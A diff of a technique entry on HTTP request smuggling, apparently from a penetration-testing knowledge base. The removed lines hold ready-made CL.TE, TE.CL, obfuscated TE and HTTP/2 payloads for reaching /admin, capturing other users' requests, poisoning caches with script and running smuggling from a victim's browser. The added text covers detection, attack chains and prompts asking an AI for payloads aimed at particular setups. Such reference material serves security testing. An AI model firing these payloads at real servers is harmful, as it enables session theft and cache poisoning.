@@ -1,212 +1,45 @@
 ---
 id: "http-request-smuggling"
-title: "HTTP Request Smuggling - CL.TE, TE.CL, H2, Browser-Powered"
+title: "Advanced HTTP Request Smuggling (2025)"
 type: "technique"
 category: "web-application"
-subcategory: "deserialization"
-tags: ["request-smuggling", "http", "cl-te", "te-cl", "http2", "desync", "cache-poisoning", "portswigger"]
+subcategory: "infrastructure"
+tags: ["hrs", "desync", "http2", "clte", "tecl"]
 difficulty: "expert"
-platforms: ["linux", "macos", "windows"]
-related: ["cache-poisoning", "ssrf-techniques"]
-updated: "2026-03-30"
+updated: "2026-04-16"
 ---
 
 ## Overview
+Modern HTTP Request Smuggling (HRS) focuses on parser differentials between CDNs/Proxies and backend origin servers, primarily exploiting HTTP/2 downgrading, zero-length body parsing, and chunk extension smuggling.
 
-HTTP request smuggling exploits discrepancies between how front-end (CDN/proxy/WAF) and back-end servers parse HTTP request boundaries. By sending ambiguous requests, attackers can "smuggle" a hidden request that gets processed as a separate request on the back-end. Impact: bypass WAFs, hijack other users' requests, poison caches, escalate to account takeover. James Kettle (PortSwigger) earned $200k+ in bounties from smuggling in two weeks.
+## Advanced Attack Vectors
 
-## CL.TE (Content-Length vs Transfer-Encoding)
+### 1. HTTP/2 Downgrading (H2.CL / H2.TE)
+When a front-end server receives HTTP/2 but downgrades it to HTTP/1.1 to talk to the backend, it must translate H2 frames into HTTP/1.1 format.
+- **H2.CL**: You inject a `Content-Length` header via pseudo-headers. The backend uses the injected CL instead of the actual frame length.
+- **H2.TE**: You inject a `Transfer-Encoding: chunked` header. The backend parses chunks while the front-end parsed frames.
 
-Front-end uses `Content-Length`, back-end uses `Transfer-Encoding: chunked`.
+### 2. Zero-Length Smuggling
+- **0.CL (Zero Content-Length):** The front-end sees `Content-Length: 0` and stops parsing. The backend ignores `0` and parses the next request as the body of the first.
+- **TE.0 (Transfer-Encoding Zero):** The front-end uses `Transfer-Encoding: chunked`, but the backend ignores it and assumes `Content-Length: 0`.
 
+### 3. Chunk Extension Smuggling
+Injecting newline characters (`\n`, `\r`) into HTTP chunk extensions.
 ```http
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 13
-Transfer-Encoding: chunked
-
-0
-
-SMUGGLED
+0;key=value\n\nGET /smuggled HTTP/1.1
 ```
+If the backend parser evaluates the newline inside the extension, it splits the request.
 
-The front-end forwards 13 bytes (including `0\r\n\r\nSMUGGLED`). The back-end sees the chunked `0` terminator and treats `SMUGGLED` as the start of the next request.
+## Detection Methodology (Response Queue Poisoning)
+To confidently confirm desync without relying solely on timeouts:
+1. Send a smuggled request designed to trigger a specific response (e.g., a 404 to a non-existent endpoint).
+2. Immediately send a normal request (e.g., to `/`).
+3. If the normal request returns the 404 intended for the smuggled request, you have successfully poisoned the socket connection.
 
-### Exploit — bypass front-end access control
-```http
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 116
-Transfer-Encoding: chunked
-
-0
-
-GET /admin HTTP/1.1
-Host: target.com
-Content-Length: 10
-
-x=
-```
-
-## TE.CL (Transfer-Encoding vs Content-Length)
-
-Front-end uses `Transfer-Encoding: chunked`, back-end uses `Content-Length`.
-
-```http
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 4
-Transfer-Encoding: chunked
-
-5c
-GPOST / HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
-
-x=1
-0
-
-
-```
-
-## TE.TE (Obfuscated Transfer-Encoding)
-
-Both servers support chunked, but one can be tricked into ignoring it with obfuscation.
-
-```http
-Transfer-Encoding: chunked
-Transfer-encoding: x
-Transfer-Encoding: chunked
-Transfer-Encoding : chunked
-Transfer-Encoding: xchunked
-Transfer-Encoding: chunked\r\n\t
-Transfer-Encoding:
- chunked
-X: X\nTransfer-Encoding: chunked
-Transfer-Encoding
-: chunked
-```
-
-## HTTP/2 Smuggling (H2.CL / H2.TE)
-
-HTTP/2 downgrades to HTTP/1.1 at the reverse proxy, enabling new smuggling vectors.
-
-### H2.CL — inject Content-Length in HTTP/2
-```
-:method: POST
-:path: /
-:authority: target.com
-content-length: 0
-
-GET /admin HTTP/1.1
-Host: target.com
-
-```
-
-### H2.TE — inject Transfer-Encoding in HTTP/2
-```
-:method: POST
-:path: /
-:authority: target.com
-transfer-encoding: chunked
-
-0
-
-GET /admin HTTP/1.1
-Host: target.com
-
-```
-
-### CRLF injection in HTTP/2 headers
-```
-:method: POST
-:path: /
-:authority: target.com
-foo: bar\r\nTransfer-Encoding: chunked
-```
-
-## Browser-Powered Smuggling
-
-Trick a victim's browser into issuing a smuggling attack via fetch/XHR.
-
-```javascript
-// CL.0 — Content-Length body ignored by back-end for GET-like methods
-fetch('https://target.com/', {
-    method: 'POST',
-    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
-    mode: 'no-cors',
-    credentials: 'include'
-});
-```
-
-## Smuggling to Capture Other Users' Requests
-
-```http
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 244
-Transfer-Encoding: chunked
-
-0
-
-POST /log HTTP/1.1
-Host: target.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 500
-
-data=
-```
-
-The next legitimate user's request (with their cookies/auth headers) gets appended to the `data=` parameter and sent to `/log`.
-
-## Smuggling to Poison Cache
-
-```http
-POST / HTTP/1.1
-Host: target.com
-Content-Length: 130
-Transfer-Encoding: chunked
-
-0
-
-GET /static/main.js HTTP/1.1
-Host: target.com
-Content-Length: 10
-
-x=<script>alert(1)</script>
-```
-
-The cache stores the poisoned response for `/static/main.js`, serving XSS to all users.
-
-## Detection
-
-```bash
-# Burp Suite — HTTP Request Smuggler extension (automated)
-# Turbo Intruder — timing-based detection
-
-# Manual CL.TE detection
-# Send request with CL that includes smuggled prefix
-# If the smuggled prefix causes a 404 or different response on the NEXT request, it's vulnerable
-
-# Timing detection
-# CL.TE: if back-end times out waiting for chunked terminator, it's using TE
-# TE.CL: if front-end times out, it's using TE
-```
+## Exploitation Chains
+1. **Smuggling + Cache Deception:** Smuggle a request for sensitive data just as a victim requests a static file (`/js/app.js`). The CDN caches the sensitive data under the static file path.
+2. **Internal API Routing:** Smuggle requests to internal IP headers or non-public paths (e.g., `/admin`).
 
 ## Deep Dig Prompts
-
-```
-Given this target [CDN/proxy info, HTTP version support]:
-1. Identify the front-end and back-end technology.
-2. Test CL.TE, TE.CL, and TE.TE obfuscation variants.
-3. Check for HTTP/2 downgrade smuggling (H2.CL, H2.TE, CRLF in headers).
-4. If smuggling works, chain with: cache poisoning, request hijacking, or WAF bypass.
-5. Test CL.0 for browser-powered smuggling potential.
-```
-
-## Tools
-
-- **HTTP Request Smuggler** — Burp extension by James Kettle
-- **smuggler.py** — Automated smuggling detection
-- **h2csmuggler** — HTTP/2 cleartext smuggling
-- **Turbo Intruder** — Timing-based detection
+- "Analyze this target's CDN/Backend combo. If it's Cloudflare + Spring Boot, suggest an H2.TE downgrade payload."
+- "Given these smuggled responses, build a Response Queue Poisoning chain."
